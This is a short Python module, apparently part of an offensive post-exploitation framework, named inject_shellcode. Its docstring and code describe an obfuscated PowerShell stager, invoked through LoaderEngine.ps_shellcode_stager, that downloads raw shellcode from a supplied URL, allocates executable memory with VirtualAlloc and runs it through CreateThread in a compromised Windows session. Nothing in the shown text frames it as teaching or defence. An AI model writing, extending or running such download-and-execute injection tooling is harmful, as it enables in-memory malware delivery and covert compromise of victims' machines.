"""
modules/inject_shellcode.py — Windows Shellcode Injection Module

Generates a PowerShell command that downloads raw shellcode from a URL,
allocates executable memory, and runs it via CreateThread.
"""
import sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from loader_engine import LoaderEngine

MODULE_INFO = {
    "name": "inject_shellcode",
    "description": "VirtualAlloc shellcode injection (Windows, in-memory)",
    "author": "Hider",
    "platform": "windows",
}


def run(session, args):
    """
    args[0] = URL to raw shellcode blob
    """
    if not args or len(args) < 1:
        return "[!] Usage: inject_shellcode <shellcode_url>"
    url = args[0]
    return LoaderEngine.ps_shellcode_stager(url, obfuscate=True)
